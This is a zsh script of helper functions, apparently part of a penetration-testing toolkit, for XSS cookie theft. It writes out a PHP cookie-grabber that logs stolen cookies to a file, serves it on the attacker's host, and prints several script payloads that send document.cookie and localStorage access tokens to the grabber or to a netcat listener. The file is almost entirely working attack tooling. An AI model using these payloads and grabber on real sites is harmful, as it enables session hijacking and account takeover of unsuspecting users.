#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-xss
#############################################################

qq-enum-web-xss-grabber-host() {
    local l && read "l?LHOST: "

cat <<EOF | tee grabber.php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);
?>s
EOF

    print -z "php -S ${l}:80"
}


qq-enum-web-xss-grabber-payloads(){
echo $(cat << END 
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
END
)
}

qq-enum-web-xss-exfil-cookie-netcat() {
    local l && read "l?LHOST: "
    __warn "Start a netcat listener on port 80"
    echo "<script> new Image().src=\"http://${l}/page?var=\"+document.cookie; </script>" 
}

